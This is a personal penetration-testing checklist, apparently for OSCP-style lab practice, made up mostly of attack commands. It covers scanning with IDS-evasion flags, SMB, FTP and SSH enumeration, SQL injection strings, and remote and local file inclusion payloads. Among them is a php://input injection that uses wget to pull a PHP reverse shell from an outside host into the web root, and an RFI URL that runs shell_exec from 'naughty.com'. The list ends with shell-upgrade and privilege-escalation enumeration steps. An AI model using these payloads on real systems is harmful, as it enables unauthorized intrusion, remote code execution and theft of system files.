<h1>PWNAGE CHECKLIST</h1>
<h2>Basic things I forget to check.</h2>

- establish vpn connectivity / confirm connectivity
- check my ip
- Scan target network
  - basic ping sweep on large range
  - select target – make note of ip in evernote
  - document everything
- Wireshark
  - Set to specific interface
  - Check how requests being handled
  - Htmlentities / escaping / str replace
  - tcp connect success or resets
  - Responses from cli connect attempts
  - Filtering
        - ``` ip-addr==192.192.192.192 ```
- Indepth nmap scan
  - ``` nmap -sC -sV -O -A -T2/3 IP-TARGET -v ```
  - SAFE SCRIPTS, SERVICE DISCOVERY, OS DETECTION, SLOWER SCAN (TO BE SAFE), VERBOSE
  - ``` nmap -sU -T3 Ip-target -v ```
  -```--source-port 100 ``` just to try evade, change to well-known port number 
- Port 80 / 443 open
  - ``` nikto -host ip-target -evasion 8 ``` (Many others check -H)
  - ``` dirb http://Ip-target -r ``` **Different wordlist perhaps**
  - Non-recursive to save time, then inspect further if necessary 
  - Try nmap ``` -–script=http-enum.nse ``` (others available)
  - Check site in browser (http/https)
   - Resolve host name if necessary (etc/hosts)
   - Cookies
   - GET / POST
   - Check source
    - Directories
    - Comments
    - Script links
    - Form methods
    - Login forms
     - Versions/names/brands etc
      - Basic sql injection
        -``` ‘or 1=1```
        -```union```
- Ports 139, 445
  - nmap enumerate if possible with scripts if nothing came up before. perhaps change scan speed to slower one
  - enum4linux
  - smbclient
    -```smbclient \\\\ip\\share```
   - try to connect to them to see if they are truly alive
   - Banner grabbing even if booted
   - ```nbtscan [ip-range]``` (https://highon.coffee/blog/nbtscan-cheat-sheet/)
   
- Port 22
  - Banner grabbing
    -```ssh root@192.192.192.192```
- Port 21
  - Banner grabbing
  -```ftp root@ip-target```
  - Try anonymous login
  - Check for version numbers
  - use searchsploit / google for known vulns


- Low priv
  - find writeable directories if /tmp or /dev/shm not available
    - ```find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;```
  - netcat 
    -```>``` output to a file
    - ```nc -nv target-ip port < filename``` (send from kali)
  - upgrade linux shell
    - ```python -c “import pty; pty.spawn(‘/bin/bash’)”```
    - ctrl+z backgrounds the shell on local box
      - then type: 
        - ```ssty raw -echo```
        - ```fg```
        - ```reset```
        - if size is an issue type:
          - ```stty size``` (returns current window size)
          - ```stty -rows 48 -columns 120``` (eg size)
- Priv esc linux
  - try ```sudo su``` or ```sudo -l```
  - if these don’t work try get kernel and distro info to look for exploits
  - ```uname -ar```
  - ```cat /etc/issue```
  - ```cat /etc/*-release```
  - ```cat /etc/lsb-release```
  - ```cat /etc/redhat-release```
  - Available programs/languages on host:
    - Perl,python etc
    - Nc,ncat,wget,curl

- Remote file inclusion (https://sushant747.gitbooks.io/total-oscp-guide/remote_file_inclusion.html)
    - Similar to local file inclusion while not hosted on the target
    - Rarer than LFI due to php.ini needs to configured for it 
    - Requres unsanitised parameter:
      - ```$theFile = $_REQUEST[“file”];```
      - ```Include($theFile . “.php”);```
    - Now in browser:
      - http://192.192.192.192/index.php?page=http://naughty.com/badfile.txt
    - Badfile.txt:
      - ```<?php echo shell_exec("whoami");?>```

- LFI (https://highon.coffee/blog/lfi-cheat-sheet/)
  - Directory traversal
    - ```foo.php?file=../../../../../../../etc/passwd```
  - PHP ```expect:``` #Not enabled by default, uses expect wrapper to execute commands
    - http://127.0.0.1/fileincl/example1.php?page=expect://ls
  - PHP (POST request) ```php://input```
    - http://192.168.183.128/fileincl/example1.php?page= **php://input**
      - input can be: ```<? system('wget http://192.192.192.192/php-reverse-shell.php -O /var/www/shell.php');?>```
      - In browser: http://192.192.192.192/shell.php
  - PHP ```php://filter```
    - http://192.192.192.192/fileincl/example1.php?page= **php://filter/convert.base64-encode/resource=../../../../../etc/passwd**
    - Must decode the output from base64
  - /proc/self/environ (If you able to write there)
    - Manipulate ```User Agent``` in Burp
  - https://highon.coffee/blog/lfi-cheat-sheet/#fimap--phpinfo-exploit
    - Uses phpinfo() to write temporary files together with fimap
      
- WAF
  wafw00f http://example.com
  
- Transferring files
  - I prefer SimpleHTTPServer to see active transfers
  -  ```python -m SimpleHTTPServer 443``` 

**usefull links**
- https://netsec.ws/?p=331	- msfvenom,shells,tips
- https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97
- https://sushant747.gitbooks.io/total-oscp-guide/connections.html


